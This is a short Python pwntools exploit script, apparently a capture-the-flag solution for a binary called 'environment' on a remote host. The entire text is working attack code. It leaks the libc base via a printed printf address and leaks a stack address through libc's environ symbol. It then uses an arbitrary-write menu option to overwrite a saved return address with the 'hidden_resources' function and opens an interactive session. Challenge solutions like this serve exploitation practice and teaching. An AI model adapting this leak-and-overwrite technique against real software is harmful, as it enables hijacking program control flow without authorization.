from pwn import *

def recycle():
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "2")
	p.sendlineafter("> ", "N")

def plant(where, what):
	p.sendlineafter("> ", "1")
	p.sendlineafter("> ", str(where))
	p.sendlineafter("> ", str(what))

p = remote("206.189.121.131", 31886)
elf = ELF("environment")
libc = elf.libc

for i in range(5):
	recycle()
p.recvuntil("0x")
libc.address = int(p.recvline().strip().replace(b"]", b""), 16) - libc.symbols['printf']
log.info(f"LIBC:   {hex(libc.address)}")

for i in range(5):
	recycle()
p.sendlineafter("> ", str(libc.symbols['environ']))
p.recv(7)
stack = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"STACK:  {hex(stack)}")

ret = stack - 0x120
log.info(f"RET  :  {hex(ret)}")

plant(ret, elf.symbols['hidden_resources'])
p.interactive()